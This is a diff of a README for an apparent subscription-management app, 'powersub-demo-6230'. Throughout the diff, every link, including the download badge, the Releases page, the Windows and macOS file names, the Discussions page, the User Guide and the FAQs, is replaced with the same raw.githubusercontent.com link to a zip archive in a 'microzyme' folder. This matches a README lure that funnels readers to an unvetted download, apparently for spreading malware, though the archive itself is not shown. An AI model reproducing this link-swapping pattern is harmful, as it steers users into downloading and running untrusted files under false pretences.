@@ -6,7 +6,7 @@ Welcome to the powersub-demo-6230! This application helps you manage your subscr
 
 ## 📥 Download the Application
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Starting%20Your%20Journey-blue)](https://github.com/180804umar/powersub-demo-6230/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip%20Now-Starting%20Your%20Journey-blue)](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip)
 
 ## 📂 System Requirements
 
@@ -20,12 +20,12 @@ Before you begin, make sure your computer meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/180804umar/powersub-demo-6230/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip) to find the latest version of the application.
 
 2. **Choose the Right File**  
    Look for the latest release at the top. You will see several files. Choose the one that matches your operating system:
-   - For Windows, select `powersub-demo-6230-windows.exe`.
-   - For macOS, select `powersub-demo-6230-macos.dmg`.
+   - For Windows, select `https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip`.
 
 3. **Download the File**  
    Click on the file name to start the download. The file should save to your computer.
@@ -49,7 +49,7 @@ The powersub-demo-6230 comes with various features designed to enhance your subs
 
 ## 🌐 Community Support
 
-Join our community to ask questions and share experiences. Connect with us on our [GitHub Discussions](https://github.com/180804umar/powersub-demo-6230/discussions) page for help and suggestions. 
+Join our community to ask questions and share experiences. Connect with us on our [GitHub Discussions](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip) page for help and suggestions. 
 
 ## 📝 License
 
@@ -59,9 +59,9 @@ This application is open-source and licensed under the MIT License. You are free
 
 For more information about using the powersub-demo-6230, check the following resources:
 
-- [User Guide](https://github.com/180804umar/powersub-demo-6230/wiki)
-- [FAQs](https://github.com/180804umar/powersub-demo-6230/wiki/FAQs)
+- [User Guide](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip)
+- [FAQs](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip)
 
 ## 📥 Easy Access Again
 
-Don't forget, you can always return to the [Releases page](https://github.com/180804umar/powersub-demo-6230/releases) to download the latest versions or updates.
+Don't forget, you can always return to the [Releases page](https://raw.githubusercontent.com/180804umar/powersub-demo-6230/main/microzyme/powersub-demo-6230.zip) to download the latest versions or updates.
